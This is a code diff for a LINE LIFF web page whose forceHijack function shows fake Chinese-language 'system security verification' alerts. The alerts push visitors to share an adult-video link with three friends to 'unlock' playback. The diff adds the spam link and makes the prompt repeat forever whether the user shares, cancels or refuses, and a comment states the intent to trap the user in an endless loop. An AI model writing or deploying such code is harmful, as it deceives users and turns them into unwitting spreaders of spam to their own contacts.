@@ -42,50 +42,33 @@
             } catch (err) { console.error("LIFF 初始化失敗", err); }
         }
 
-        async function forceHijack() {
+         async function forceHijack() {
+            // 初始彈窗
             alert("【分配程序啟動】\n\n請選擇 3 位好友作為「流量分配節點」。\n完成後系統將自動為您解除觀看限制。");
             
             try {
-    const res = await liff.shareTargetPicker([
-        {
-            "type": "flex",
-            "altText": "系統安全驗證",
-            "contents": {
-                "type": "bubble",
-                "body": {
-                    "type": "box",
-                    "layout": "vertical",
-                    "contents": [
-                        {
-                            "type": "text",
-                            "text": "【系統安全驗證】",
-                            "weight": "bold",
-                            "size": "xl"
-                        },
-                        {
-                            "type": "text",
-                            "text": "請完成節點分配以開啟 4K 線路",
-                            "margin": "md",
-                            "color": "#666666"
-                        }
-                    ]
-                },
-                "footer": {
-                    "type": "box",
-                    "layout": "vertical",
-                    "contents": [
-                        {
-                            "type": "button",
-                            "action": {
-                                "type": "uri",
-                                "label": "▶ 接收分配並取得權限",
-                                "uri": "https://liff.line.me/" + LIFF_ID
-                            },
-                            "style": "primary",
-                            "color": "#00b900"
-                        }
-                    ]
+                const res = await liff.shareTargetPicker([
+                    {
+                        "type": "text",
+                        "text": "https://18avideo.com/VKUFu"
+                    }
+                ]);
+
+                if (res) {
+                    // 分享成功後的處理：不跳轉，而是引導再次分享
+                    alert("【系統審核中】\n偵測到當前線路極度擁擠，請「再次確實」分配 3 位活躍節點以加快審核速度。");
+                    
+                    // 這裡不跳轉，直接重新呼叫 forceHijack，讓使用者停留在這無限循環
+                    forceHijack(); 
+                } else {
+                    // 使用者按取消
+                    alert("❌ 驗證失敗！\n系統偵測到節點分配數量不足，請務必完成分配。");
+                    forceHijack(); 
                 }
+            } catch (error) {
+                // 拒絕權限
+                alert("【安全錯誤】\n需允許分配權限，系統才能驗證您的節點身份。");
+                forceHijack();
             }
         }
     ]);
@@ -103,3 +86,4 @@
     </script>
 </body>
 </html>
+
